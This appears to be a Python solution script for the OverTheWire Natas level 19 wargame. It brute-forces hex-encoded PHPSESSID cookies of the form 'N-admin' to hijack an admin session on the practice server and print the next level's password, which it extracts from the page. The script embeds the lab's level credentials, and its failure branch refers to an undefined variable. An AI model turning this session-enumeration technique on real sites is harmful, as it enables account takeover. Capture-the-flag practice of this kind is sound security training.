#!/usr/bin/python3.9

"""This script is a solution to Overthewire Natas level 19."""

import binascii
import requests as r
from requests.auth import HTTPBasicAuth
from fake_useragent import UserAgent

url = "http://natas19.natas.labs.overthewire.org/"

lvl_user = "natas19"
lvl_pass = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

headers = {
    "User-Agent": UserAgent().random
    }

try:
    for id in range(0,641):
        session = binascii.hexlify((str(id) + "-admin").encode()).decode()

        res = r.get(
            url,
            headers=headers,
            cookies={"PHPSESSID": session},
            auth=HTTPBasicAuth(lvl_user, lvl_pass))

        if id%25 == 0 : print(f"[FUZZING] ({id}/640)")

        password = res.text.split("\n")[-4]
        password = password.split("<")[0].split(" ")[-1]
        
        if password != "natas20.":
            print(f"[FOUND] Cookie: PHPSESSID={session} (From Hex: {id}-admin)")
            break

except Exception as e:
    print("[ERROR]", e, "\n")
    exit(-1)

if password and password.isalnum() and len(password) == 32:
    print("[PASSWORD]", password)
else:
    print(
        f"[FAIL] - [Status: {status}]",
        f"[Password({len(password)}): {password}]")